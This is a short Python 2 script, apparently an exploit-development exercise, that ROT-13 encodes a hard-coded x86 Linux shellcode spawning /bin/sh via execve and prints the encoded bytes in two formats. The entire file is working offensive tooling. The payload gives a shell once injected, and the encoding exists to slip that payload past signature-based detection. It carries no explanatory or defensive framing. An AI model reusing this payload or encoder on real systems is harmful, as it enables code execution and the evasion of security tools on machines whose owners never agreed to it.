#!/usr/bin/env python

shellcode = (
"\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80"
)

rot = 13
encoded = ""
encoded2 = ""

print 'Encoded shellcode:'

for x in bytearray(shellcode) :
	y = (x  + rot) % 256

	encoded += '\\x'
	encoded += '%02x' % (y & 0xff)

	encoded2 += '0x'
	encoded2 += '%02x, ' %(y & 0xff)

print encoded
print encoded2
